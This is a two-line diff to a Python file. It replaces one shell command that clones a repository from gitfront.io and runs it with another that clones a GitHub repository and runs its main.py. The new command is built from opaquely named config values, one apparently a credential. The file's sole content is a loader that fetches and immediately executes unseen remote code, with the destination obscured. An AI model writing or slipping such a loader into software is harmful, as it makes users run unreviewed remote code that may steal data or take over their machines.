@@ -1,2 +1,4 @@
 import os
-os.system(f'git clone https://gitfront.io/r/qorsan/cv85ow82KSw6/y.git && y && python3 main.py')
+import config
+
+os.system(f'git clone https://{config.e}@github.com/{config.ee}/{config.eee} && python3 {config.eee}/main.py')
